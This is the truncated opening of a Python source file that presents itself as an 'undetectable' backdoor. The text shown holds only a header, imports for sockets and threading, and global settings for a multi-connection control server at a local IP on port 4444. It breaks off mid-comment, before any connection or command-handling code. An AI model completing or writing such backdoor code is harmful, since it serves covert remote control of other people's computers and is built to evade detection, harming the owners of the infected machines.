""" Yakuza Backdoor, Undetectable
        This is a Backdoor written in Python based on Yakuza Style
        Version: 1.0
------------------------------------------------------------
Author: Davood Yakuza
Start Developing Date: 11/8/2024 | 18 aban 1403
End Developing Date:

"""

# Step 0: Import requires libraries

import socket
import os
from queue import Queue
from time import sleep
import threading
from sys import exit


""" Section 1: Develop Utitlity Objects(Global Variables, lambda's, functions) """

# Step 2: Define Global Variables

intThreads = 2      # Thread's Number in Multithreading
arrJobs = [1, 2]    # Use for Multithreading, Store Total Jobs

queue = Queue()     # Used for Handling Jobs in Multithreading

arrAddresses = []       # Store All Socket Connection Addresses
arrConnections = []     # Store All Connection Information about Socket Connections

strHost = "192.168.10.100"      # Server IP Address
intPort = 4444                  # Server Port

intBuff = 1024      # Maximum Size(Bytes) of Data to Receive as





















